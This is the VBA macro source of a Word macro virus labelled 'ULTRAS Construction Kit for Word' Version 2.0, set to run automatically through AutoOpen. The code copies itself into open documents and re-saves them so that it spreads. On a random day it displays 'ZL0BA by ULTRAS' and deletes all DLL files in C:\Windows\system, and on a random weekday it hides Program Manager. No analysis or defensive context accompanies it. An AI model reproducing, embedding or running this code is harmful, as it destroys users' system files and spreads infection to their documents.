   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   '*************************************
   '* ULTRAS CONSTRUCTION KIT FOR WORD  *
   '*            Version 2.0            *
   '*************************************
   Public Sub Main()
   Dim uCkAo$
   Dim uCkAc$
   On Error Resume Next
   uCkAo$ = WordBasic.[FileName$]() + ":AutoOpen"
   uCkAc$ = "AutoClose"
   WordBasic.MacroCopy uCkAo$, uCkAc$
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy uCkAc$, uCkAo$
   WordBasic.FileSave
   Payload
   End Sub
   Private Sub Payload()
   Dim U
   Dim Destroy$
   Dim G
   U = WordBasic.Int(Rnd() * 30) + 1
   If WordBasic.Day(WordBasic.Now()) = U Then
   WordBasic.MsgBox "ZL0BA by ULTRAS", ("UCK"), 16
   Destroy$ = "C:\Windows\system\*.dll"
   SetAttr Destroy$, 0
   WordBasic.Kill Destroy$
   End If
   G = WordBasic.Int(Rnd() * 6) + 1
   If WordBasic.Weekday(WordBasic.Now()) = G Then
   WordBasic.AppHide "Program Manager"
   End If
   End Sub
